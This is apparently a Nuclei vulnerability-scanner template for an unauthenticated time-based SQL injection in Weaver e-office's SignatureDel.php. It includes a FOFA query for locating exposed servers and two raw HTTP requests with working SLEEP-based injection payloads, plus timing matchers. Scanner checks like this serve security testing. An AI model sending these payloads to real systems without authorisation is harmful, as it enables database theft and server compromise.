id: Weaver-e-office-SignatureDel_php-sql-time
info:
  name: 泛微e-office SignatureDel.php sql注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="泛微-EOffice"
    泛微e-office SignatureDel.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/QkYcb-Or4kboghZo2fkB2g
  tags: sql injection

http:
  - raw:
      - |
        GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(4)))x) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
      - |
        GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(8)))x) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and